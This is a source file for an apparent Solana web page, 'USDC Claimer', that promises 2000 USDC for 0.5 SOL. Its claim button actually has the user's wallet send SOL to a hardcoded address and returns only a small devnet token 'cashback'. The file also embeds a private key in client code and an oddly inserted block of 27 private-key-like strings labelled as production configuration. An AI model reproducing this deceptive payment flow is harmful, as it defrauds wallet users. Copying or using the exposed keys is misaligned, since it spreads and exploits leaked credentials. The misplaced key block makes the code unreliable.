/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "5J1vU8Kn6J4MVxfALKycFaifLtiNdnkRe6jJQZ1tiKq44Cn5XHfEAAf7BQMjGJq4N9TVSjLD6PvHzdmrRtTheQ1K"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "216LuzgUifvHPzGe18N4CJBDSv7DkPgFSYbsWuo16mkpELkyvr53CJjFqSHwSU1F8h44PYnhAidtqMAomanjYdDc",
  "key1": "4NPy1yLAycw6Djc68pRYah4TgziQCsnRd8QwwxRHQTgKvbnZ1NBJd3np6W4rTNCQ2Hnf98HCWVNEoBEsGzWrhwLq",
  "key2": "5ZyUaDmrhjj2sDAzq2UGXbMotu7Py5MFjkbmUNprom1UANXun9f9kkSKegbgkt9pgdHBiKyxr2dz4Cs6GjosUtMq",
  "key3": "5UrPEKNTm4i1xy1XDYXVwTTwLoiRJd9fXNFdjRxfRQLFVKmxkNuLXoBmrAk6z4kxeMbDh9iF93Sipcp6GZh6JZ5g",
  "key4": "BmuWzkAMvSGL9kn181qB6UyssagzjfiZ5jHqv4Rrd33TRr9J4a957gdghTtBsuYAphRicQZRGq2YogrpKPxWgju",
  "key5": "33p76PXNZK9kch1kbiNYjGthL7PiB1qwTgHeXeqJZmPAo5x3u53ceQoLLeiQ2hc6HomzNhJ2xuUwN1XvQwuj8jQg",
  "key6": "26JuXwPN4yuumVpf15jca8ZgSSsJsP76cPBoUrUgUdC2pShs2QaURJsCtmZkXWZQecBRTqLA2zwXcTQdWFC3nEqo",
  "key7": "i5G3TeVrYa7ekxoBqSSpzwEbr7agWCaNqwoRU6VP9RHB52iom3a72n1HGp1J8MPaCMuHLawDjXpfqDHxUAQYM9G",
  "key8": "WoqKsiVSGNSVvEvXi1wFL1gRBd3ZyZxMhKB3dHSSwrhyiGzSAW8Kh119cx3iFdWwt7v7tGqGReG8jv1Z63UoXZR",
  "key9": "5v91ifn55Z32B5KzHfrqP1nmwre2QYQJywXCHArB6JqvfwgBnFeiD9ypVcYWFePu8G1qnAAjwZnRWNj3pZBBJA4u",
  "key10": "4iXWaVQYtwmGXTELgWBp6R86DMLdtASrVQZ7sh4uNANqA7vCTQrJcTvMbgJT9hsSw9BcpKeG9jn7GF7GfAc392Zk",
  "key11": "3waaKHj86MPgaA6pRbUNbmPBFgXc3rgEyRBrzQTVKfyY6GnUreyaofjRj7qERxPa3qm93HhDfibTBLcASawnrczw",
  "key12": "2Hg4d4sw7MiNAeu8zC2oes9uHHdJpjdinwunqsgjchnZDFzc1fLPx6ynTfZscHKCw398aLxu8FUD2eVPWX5NPqcn",
  "key13": "4GvYwazpoGoKnnJipXTYTgLH5M6pFJZVatZmpLsEUG7Kq82EvbG5YL9C7fnYbukZDqbq12ffUQbsxc1LVQegaHQR",
  "key14": "5kx8UiN8wiWP6TdfGpEocqRr3N1tciAHUZqQqU6e23eoPFVtydL42pHK1z1tGU3cTtmgHcHhoSXvx3KK5Hr1rosV",
  "key15": "5HD8JSCUrXYkGwJru6Y9FGuNQFkezg7i2kgtKExRLF1tW2f6Zu5WFYxj73LN2BnLTH6689iTxhhc2vA97RG6tcSq",
  "key16": "PyqSQPcZugdeXmguFBhzXdrJwNpBbSw2cdkXEzYNbKHXDenwwyqPVeUymAG5DKVj5Q9gZsdhy2UJNpeeUBXzxkX",
  "key17": "3mnY7w3HKFUke7kv3NZ3JVtHVr3KvyPf2JWQob6MhE3eYmwe4BexFwDT8uMbtH5hMwxUnBt31Enw2bih2f4wipzg",
  "key18": "4xBQS4ENz8i6hVCBYDxPriB7gaFJNVALZwuJhD64M2fvnFWZ7QsaLiXUYQ4gZzAWrLVXDkMX716mozTUmWdncaSU",
  "key19": "ReJQCNR853QQGreGcYSV3qCpfZ63fhc1UKdSyPdqYXZHkzWQzHURuLA2mdJ3UhbM5LNWMGW5Q2gwybPRcEsXvhr",
  "key20": "3a8v9rH7M9hAmKZLJwGQKS3qjmq2ks1K1jGESch2D72dJJS66CEPSy8Gws3aT2vpTRnCJ2nZx5BpuR1LjYzk4G4b",
  "key21": "2D8jCBLSCpKHk8kZtqR5hTr5jrmoTWRAGh95dUKkazkJQ6TnB8wH7pXd7Dq6Dr4YWYSHnQe3epgSQWwiStCbx2qM",
  "key22": "3DRdbSj8dEADG1E8euvo8dZcULGM2buw5Ut4GQof4M6yncyyYmASSiGA3ebHVftGTFraJgbDyfYiViu7FYoJqaF3",
  "key23": "3fUWerGa5TwC7q7uDWs1bLdyXsmhw5XCC3dNHzkXtTGYLDrYni4TQQz71kPhUtJxwRETpNfpZbzMQKciV9uEoF4c",
  "key24": "iaJC6jhXLeS41CxsSVac9BbdH6Uev55v5ym1BDZTwZCR7SUoYVQR3ncWx421bosstytb7RHFRxrfEazKzfNmzxr",
  "key25": "2DDc5L69NVexWvMx5xTMEvV4v1drs1FxMrHfcz53Cg7SqSzkQbcw5UR5Ydfue7WvHXhLCJiK2FeD4w1J5uksE4m5",
  "key26": "Z39HFngxMg3vR6xRuhqnoafNjefJYRmJSTsMePgPsN1TeuHPfW93Dq7wkhacSUGhF2LPccTq3SJFyoVLy4EBVDx"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
